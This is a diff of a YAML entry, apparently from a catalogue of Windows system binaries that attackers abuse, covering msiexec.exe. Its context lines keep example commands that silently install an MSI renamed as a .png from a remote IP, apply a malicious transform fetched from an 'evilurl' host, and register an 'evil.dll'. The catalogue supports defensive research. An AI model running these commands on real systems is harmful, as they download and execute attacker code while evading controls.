@@ -13,7 +13,6 @@ Commands:
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: MSI
-      - Input: Custom Format
   - Command: msiexec /q /i http://192.168.100.3/tmp/cmd.png
     Description: Installs the target remote & renamed .MSI file silently.
     Usecase: Execute custom made msi file with attack code from remote server
@@ -24,7 +23,6 @@ Commands:
     Tags:
       - Execute: MSI
       - Execute: Remote
-      - Input: Custom Format
   - Command: msiexec /y "C:\folder\evil.dll"
     Description: Calls DllRegisterServer to register the target DLL.
     Usecase: Execute dll files
@@ -35,7 +33,6 @@ Commands:
     Tags:
       - Execute: DLL
       - Execute: Remote
-      - Input: Custom Format
   - Command: msiexec /z "C:\folder\evil.dll"
     Description: Calls DllUnregisterServer to un-register the target DLL.
     Usecase: Execute dll files
@@ -46,7 +43,6 @@ Commands:
     Tags:
       - Execute: DLL
       - Execute: Remote
-      - Input: Custom Format
   - Command: msiexec /i "https://trustedURL/signed.msi" TRANSFORMS="https://evilurl/evil.mst" /qb
     Description: Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.
     Usecase: Install trusted and signed msi file, with additional attack code as transformation file, from a remote server
@@ -56,7 +52,6 @@ Commands:
     OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Execute: Remote
-      - Input: Custom Format
 Full_Path:
   - Path: C:\Windows\System32\msiexec.exe
   - Path: C:\Windows\SysWOW64\msiexec.exe
